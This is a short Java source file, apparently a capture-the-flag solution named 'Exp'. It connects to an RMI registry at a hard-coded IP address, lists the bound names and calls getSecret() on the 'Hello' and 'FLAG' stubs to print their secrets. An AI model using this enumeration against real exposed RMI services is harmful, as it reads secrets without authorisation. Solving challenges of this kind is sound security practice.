import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Exp {

    public static void main(String[] args) {

        String host = "140.113.203.209";
        int port = 11099;
        try {
            Registry registry = LocateRegistry.getRegistry(host, port);
            String[] s = registry.list();
            for(int i = 0; i < s.length; ++i) {
                System.out.println(s[i]);
            }

            RMIInterface stub2 = (RMIInterface)registry.lookup("Hello");
            String s3 = stub2.getSecret();
            System.out.println(s3);

            RMIInterface stub = (RMIInterface)registry.lookup("FLAG");
            String s2 = stub.getSecret();
            System.out.println(s2);

        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}